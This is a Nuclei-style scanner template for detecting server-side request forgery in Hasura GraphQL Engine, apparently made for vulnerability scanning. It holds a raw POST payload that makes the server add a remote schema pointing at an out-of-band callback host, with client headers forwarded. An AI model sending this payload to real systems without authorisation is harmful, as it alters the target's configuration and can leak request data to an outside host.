id: hasura-graphql-ssrf

info:
  name: Hasura GraphQL Engine - Server Side Request Forgery
  author: princechaddha
  severity: high
  description: Hasura GraphQL Engine is vulnerable to SSRF( Server Side Request Forgery )
  reference:
    - https://cxsecurity.com/issue/WLB-2021040115
  classification:
    cpe: cpe:2.3:a:hasura:graphql:*:*:*:*:*:*:*:*
    cwe-id: CWE-918
  metadata:
    max-request: 1
    vendor: hasura
    product: graphql
  tags: hasura,ssrf,graphql,vuln

http:
  - raw:
      - |
        POST /v1/query HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: */*

        {
           "type":"bulk",
           "args":[
              {
                 "type":"add_remote_schema",
                 "args":{
                    "name":"test",
                    "definition":{
                       "url":"https://{{interactsh-url}}",
                       "headers":[
                       ],
                       "timeout_seconds":60,
                       "forward_client_headers":true
                    }
                 }
              }
           ]
        }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 400

      - type: word
        name: graphql
        cpe: cpe:2.3:a:hasura:graphql:*:*:*:*:*:*:*:*
        part: interactsh_protocol
        words:
          - "http"
